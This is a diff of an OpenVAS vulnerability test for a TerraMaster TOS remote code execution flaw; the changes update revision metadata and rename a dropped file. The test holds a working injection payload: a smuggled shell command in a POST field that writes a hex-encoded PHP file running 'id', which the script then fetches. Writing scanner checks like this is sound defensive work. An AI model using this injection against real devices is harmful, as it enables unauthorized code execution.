@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_terramaster_tos_rce_vuln.nasl 11025 2018-08-17 08:27:37Z cfischer $
+# $Id: gb_terramaster_tos_rce_vuln.nasl 11501 2018-09-20 12:19:13Z mmartin $
 #
 # TerraMaster TOS RCE Vulnerability
 #
@@ -30,8 +30,8 @@ CPE = "cpe:/a:noontec:terramaster";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.140376");
-  script_version("$Revision: 11025 $");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:27:37 +0200 (Fri, 17 Aug 2018) $");
+  script_version("$Revision: 11501 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-20 14:19:13 +0200 (Thu, 20 Sep 2018) $");
   script_tag(name:"creation_date", value:"2017-09-19 12:13:21 +0700 (Tue, 19 Sep 2017)");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
@@ -81,7 +81,7 @@ if (!port = get_app_port(cpe: CPE))
 # <?php passthru("id"); unlink(__FILE__); ?>
 data = 'dev=b1bebe&testtype=start;\\"$(echo -en "' +
         "\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x61\\x73\\x73\\x74\\x68\\x72\\x75\\x28\\x22\\x69\\x64\\x22\\x29\\x3b\\x20\\x75\\x6e\\x6c\\x69\\x6e\\x6b\\x28\\x5f\\x5f\\x46\\x49\\x4c\\x45\\x5f\\x5f\\x29\\x3b\\x20\\x3f\\x3e\\n" +
-        '" > openvas_cve_2017_9328.php);';
+        '" > vt-test_cve_2017_9328.php);';
 
 url = '/include/ajax/GetTest.php';
 
@@ -90,7 +90,7 @@ req = http_post_req(port: port, url: url, data: data,
 res = http_keepalive_send_recv(port: port, data: req);
 
 if ("Call to undefined function" >< res) {
-  url = '/include/ajax/openvas_cve_2017_9328.php';
+  url = '/include/ajax/vt-test_cve_2017_9328.php';
   req = http_get(port: port, item: url);
   res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);
 
